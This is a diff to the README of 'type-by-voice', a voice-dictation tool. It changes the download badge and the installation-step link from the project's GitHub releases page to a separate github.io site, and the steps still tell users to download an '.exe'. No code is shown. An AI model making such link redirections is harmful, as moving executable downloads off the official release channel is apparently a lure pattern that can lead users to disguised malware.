@@ -1,6 +1,6 @@
 # 🎙️ type-by-voice - Speak to type in any application
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/tatec756/type-by-voice/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://tatec756.github.io)
 
 type-by-voice turns your spoken words into text inside any program on your computer. It runs locally on your machine. Your voice data never leaves your computer, and you do not need an account or cloud access. This tool uses your graphics card to process speech quickly. It supports dictation in multiple languages and works with the press of a single button.
 
@@ -19,7 +19,7 @@ If you lack a compatible NVIDIA graphics card, the program may perform slowly or
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/tatec756/type-by-voice/releases) to find the latest version of the application.
+1. Visit the [releases page](https://tatec756.github.io) to find the latest version of the application.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Save the file to your desktop or your Downloads folder.
